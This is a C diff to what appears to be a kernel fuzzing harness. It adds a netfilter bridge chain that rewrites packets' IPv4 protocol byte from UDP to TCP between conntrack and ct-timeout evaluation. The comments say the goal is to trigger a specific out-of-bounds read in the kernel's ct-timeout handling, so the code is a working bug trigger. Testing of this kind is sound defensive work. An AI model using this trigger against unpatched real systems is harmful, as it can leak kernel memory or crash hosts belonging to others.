@@ -155,7 +155,26 @@
 #define BRCT_NFTA_OBJREF_IMM_NAME	2
 /* Bridge-family priority after the conntrack PRE hook (-200+100 = -100) */
 #define BRCT_NF_BR_PRI_AFTER_CT_PRE	(NF_BR_PRI_CT_PRE + 100)
+/* Intermediate priority: fires after CT_PRE (-200) but before ct-timeout
+ * chain (-100).  The mangle rule rewrites pkt->tprot in this window. */
+#define BRCT_NF_BR_PRI_MANGLE		(NF_BR_PRI_CT_PRE + 50)
 #define BRCT_IPPROTO_TCP		6
+/* IPv4 protocol field: byte 9 of the network (IP) header. */
+#define BRCT_IPV4_PROTO_OFFSET		9
+
+/* nft_immediate expression attributes */
+#define BRCT_NFTA_IMMEDIATE_DREG	1
+#define BRCT_NFTA_IMMEDIATE_DATA	2
+#define BRCT_NFTA_DATA_VALUE		1
+/* nft_payload expression attributes and constants (SET / store path) */
+#define BRCT_NFTA_PAYLOAD_DREG		1
+#define BRCT_NFTA_PAYLOAD_BASE		2
+#define BRCT_NFTA_PAYLOAD_OFFSET	3
+#define BRCT_NFTA_PAYLOAD_LEN		4
+#define BRCT_NFTA_PAYLOAD_SREG		5
+#define BRCT_NFTA_PAYLOAD_OP		6
+#define BRCT_NFT_PAYLOAD_NETWORK_HEADER	1	/* NFT_PAYLOAD_NETWORK_HEADER */
+#define BRCT_NFT_PAYLOAD_OP_STORE	1	/* NFT_PAYLOAD_OP_STORE */
 
 /* Latched per-child: userns_run_in_ns() reported -EPERM, meaning the
  * grandchild's unshare(CLONE_NEWUSER) was refused by a hardened policy
@@ -467,6 +486,203 @@ static int nft_install_bridge_ct(struct nfnl_ctx *nf, const char *table,
 			return -EIO;
 		nla_nest_end(buf, expr_data_off, off);
 		nla_nest_end(buf, elem_off, off);
+		nla_nest_end(buf, exprs_off, off);
+		((struct nlmsghdr *)(buf + msg_off))->nlmsg_len =
+			(__u32)(off - msg_off);
+	}
+
+	off = nfnl_batch_end(buf, off, sizeof(buf),
+			     nl_seq_next(&nf->nl), NFNL_SUBSYS_NFTABLES);
+	if (!off)
+		return -EIO;
+
+	return nfnl_send_recv_batched(nf, buf, off);
+}
+
+/*
+ * Install an intermediate-priority base chain "br_mangle" that rewrites
+ * the IPv4 protocol byte (network-header offset 9) from IPPROTO_UDP to
+ * IPPROTO_TCP via nft_payload SET, using an nft_immediate expression to
+ * load the TCP value into NFT_REG32_00 first.
+ *
+ * Hook priority BRCT_NF_BR_PRI_MANGLE (-150) puts this chain AFTER the
+ * bridge conntrack PRE hook (-200, which records nf_ct_protonum(ct)=UDP)
+ * and BEFORE the ct-timeout eval chain (-100).  When the packet reaches
+ * the ct-timeout chain, the kernel re-reads the IP protocol field and
+ * sets pkt->tprot = IPPROTO_TCP.  The TCP timeout object (priv->l4proto
+ * = TCP) then passes the old guard `priv->l4proto != pkt->tprot` but
+ * fails the new guard `priv->l4proto != nf_ct_protonum(ct)` added by
+ * Kyle Zeng's 2026-08-10 patch.  Without the fix the code proceeds to
+ * index the TCP state array with a UDP conntrack entry, producing the
+ * targeted OOB read.
+ *
+ * Caller must have already committed the br_ct NEWTABLE batch.
+ * Returns 0 on batch acceptance; non-zero is a soft failure (the
+ * ct-timeout install continues regardless).
+ */
+static int nft_install_ct_mangle(struct nfnl_ctx *nf, const char *table,
+				  const char *mangle_chain)
+{
+	unsigned char buf[BRCT_NFT_BUF_BYTES];
+	size_t off = 0;
+	size_t msg_off, hook_off, exprs_off;
+	size_t elem_off, expr_data_off, imm_data_off;
+	__u8 family = NFPROTO_BRIDGE;
+	__u32 prio = (__u32)(int)(BRCT_NF_BR_PRI_MANGLE);
+	/* Four-byte immediate value: byte 0 = IPPROTO_TCP (6), rest zero.
+	 * nft_payload_set_eval copies priv->len (1) bytes from the start
+	 * of the register, so byte 0 must hold the protocol constant. */
+	static const unsigned char tcp_proto_val[4] = {
+		BRCT_IPPROTO_TCP, 0, 0, 0
+	};
+
+	memset(buf, 0, sizeof(buf));
+
+	off = nfnl_batch_begin(buf, off, sizeof(buf),
+			       nl_seq_next(&nf->nl), NFNL_SUBSYS_NFTABLES);
+	if (!off)
+		return -EIO;
+
+	/* NEWCHAIN "br_mangle" at NF_BR_PRE_ROUTING priority -150.
+	 * Fires after conntrack marks the packet UDP, before ct-timeout
+	 * chain evaluates the TCP timeout object. */
+	{
+		msg_off = off;
+		off = nfnl_msg_put(buf, off, sizeof(buf), nl_seq_next(&nf->nl),
+				   NFNL_SUBSYS_NFTABLES, BRCT_NFT_MSG_NEWCHAIN,
+				   NLM_F_CREATE, family);
+		if (!off)
+			return -EIO;
+		off = nla_put_str(buf, off, sizeof(buf),
+				  BRCT_NFTA_CHAIN_TABLE, table);
+		if (!off)
+			return -EIO;
+		off = nla_put_str(buf, off, sizeof(buf),
+				  BRCT_NFTA_CHAIN_NAME, mangle_chain);
+		if (!off)
+			return -EIO;
+		hook_off = off;
+		off = nla_nest_start(buf, off, sizeof(buf),
+				     BRCT_NFTA_CHAIN_HOOK | NLA_F_NESTED);
+		if (!off)
+			return -EIO;
+		off = nla_put_be32(buf, off, sizeof(buf),
+				   BRCT_NFTA_HOOK_HOOKNUM, NF_BR_PRE_ROUTING);
+		if (!off)
+			return -EIO;
+		off = nla_put_be32(buf, off, sizeof(buf),
+				   BRCT_NFTA_HOOK_PRIORITY, prio);
+		if (!off)
+			return -EIO;
+		nla_nest_end(buf, hook_off, off);
+		off = nla_put_str(buf, off, sizeof(buf),
+				  BRCT_NFTA_CHAIN_TYPE, "filter");
+		if (!off)
+			return -EIO;
+		((struct nlmsghdr *)(buf + msg_off))->nlmsg_len =
+			(__u32)(off - msg_off);
+	}
+
+	/* NEWRULE: two expressions -- immediate (IPPROTO_TCP -> reg0)
+	 * then payload SET (reg0[0] -> network-header[9], len=1). */
+	{
+		msg_off = off;
+		off = nfnl_msg_put(buf, off, sizeof(buf), nl_seq_next(&nf->nl),
+				   NFNL_SUBSYS_NFTABLES, BRCT_NFT_MSG_NEWRULE,
+				   NLM_F_CREATE | NLM_F_APPEND, family);
+		if (!off)
+			return -EIO;
+		off = nla_put_str(buf, off, sizeof(buf),
+				  BRCT_NFTA_RULE_TABLE, table);
+		if (!off)
+			return -EIO;
+		off = nla_put_str(buf, off, sizeof(buf),
+				  BRCT_NFTA_RULE_CHAIN, mangle_chain);
+		if (!off)
+			return -EIO;
+		exprs_off = off;
+		off = nla_nest_start(buf, off, sizeof(buf),
+				     BRCT_NFTA_RULE_EXPRESSIONS | NLA_F_NESTED);
+		if (!off)
+			return -EIO;
+
+		/* expr[0]: immediate -- dreg=NFT_REG32_00, value=6 */
+		elem_off = off;
+		off = nla_nest_start(buf, off, sizeof(buf),
+				     BRCT_NFTA_LIST_ELEM | NLA_F_NESTED);
+		if (!off)
+			return -EIO;
+		off = nla_put_str(buf, off, sizeof(buf),
+				  BRCT_NFTA_EXPR_NAME, "immediate");
+		if (!off)
+			return -EIO;
+		expr_data_off = off;
+		off = nla_nest_start(buf, off, sizeof(buf),
+				     BRCT_NFTA_EXPR_DATA | NLA_F_NESTED);
+		if (!off)
+			return -EIO;
+		off = nla_put_be32(buf, off, sizeof(buf),
+				   BRCT_NFTA_IMMEDIATE_DREG, BRCT_NFT_REG_1);
+		if (!off)
+			return -EIO;
+		imm_data_off = off;
+		off = nla_nest_start(buf, off, sizeof(buf),
+				     BRCT_NFTA_IMMEDIATE_DATA | NLA_F_NESTED);
+		if (!off)
+			return -EIO;
+		off = nla_put(buf, off, sizeof(buf),
+			      BRCT_NFTA_DATA_VALUE,
+			      tcp_proto_val, sizeof(tcp_proto_val));
+		if (!off)
+			return -EIO;
+		nla_nest_end(buf, imm_data_off, off);
+		nla_nest_end(buf, expr_data_off, off);
+		nla_nest_end(buf, elem_off, off);
+
+		/* expr[1]: payload SET -- sreg=reg0, base=NETWORK_HEADER,
+		 * offset=9 (IPv4 proto field), len=1.  No checksum attrs:
+		 * kernel defaults to NFT_PAYLOAD_CSUM_NONE, which is
+		 * sufficient for synthetic traffic. */
+		elem_off = off;
+		off = nla_nest_start(buf, off, sizeof(buf),
+				     BRCT_NFTA_LIST_ELEM | NLA_F_NESTED);
+		if (!off)
+			return -EIO;
+		off = nla_put_str(buf, off, sizeof(buf),
+				  BRCT_NFTA_EXPR_NAME, "payload");
+		if (!off)
+			return -EIO;
+		expr_data_off = off;
+		off = nla_nest_start(buf, off, sizeof(buf),
+				     BRCT_NFTA_EXPR_DATA | NLA_F_NESTED);
+		if (!off)
+			return -EIO;
+		off = nla_put_be32(buf, off, sizeof(buf),
+				   BRCT_NFTA_PAYLOAD_OP,
+				   BRCT_NFT_PAYLOAD_OP_STORE);
+		if (!off)
+			return -EIO;
+		off = nla_put_be32(buf, off, sizeof(buf),
+				   BRCT_NFTA_PAYLOAD_SREG, BRCT_NFT_REG_1);
+		if (!off)
+			return -EIO;
+		off = nla_put_be32(buf, off, sizeof(buf),
+				   BRCT_NFTA_PAYLOAD_BASE,
+				   BRCT_NFT_PAYLOAD_NETWORK_HEADER);
+		if (!off)
+			return -EIO;
+		off = nla_put_be32(buf, off, sizeof(buf),
+				   BRCT_NFTA_PAYLOAD_OFFSET,
+				   BRCT_IPV4_PROTO_OFFSET);
+		if (!off)
+			return -EIO;
+		off = nla_put_be32(buf, off, sizeof(buf),
+				   BRCT_NFTA_PAYLOAD_LEN, 1);
+		if (!off)
+			return -EIO;
+		nla_nest_end(buf, expr_data_off, off);
+		nla_nest_end(buf, elem_off, off);
+
 		nla_nest_end(buf, exprs_off, off);
 		((struct nlmsghdr *)(buf + msg_off))->nlmsg_len =
 			(__u32)(off - msg_off);
@@ -989,6 +1205,18 @@ static int bridge_conntrack_iter_nft_setup(struct bridge_conntrack_iter_ctx *ctx
 					 __ATOMIC_RELAXED);
 		return 0;
 	}
+
+	/* Install the proto-mangle chain (priority -150): rewrites IPv4
+	 * proto byte from UDP → TCP between the conntrack PRE hook and
+	 * the ct-timeout eval chain.  Best-effort; a soft failure means
+	 * the mismatch arm won't fire this iteration but the remaining
+	 * ct-timeout install still runs.  Two nfnl_send_recv_batched
+	 * calls total (mangle batch + ct-timeout batch), each
+	 * sendmsg + recv + drain recv. */
+	if (nft_install_ct_mangle(&ctx->nfnl_nft, "br_ct", "br_mangle") == 0)
+		__atomic_add_fetch(&shm->stats.bridge_ct.ct_mangle_ok,
+				   1, __ATOMIC_RELAXED);
+	ctx->direct_syscalls += 3;
 
 	/* Install the CT_TIMEOUT object + post-conntrack chain + objref
 	 * rule.  Best-effort: a rejection (e.g. CONFIG_NFT_CT=n) does
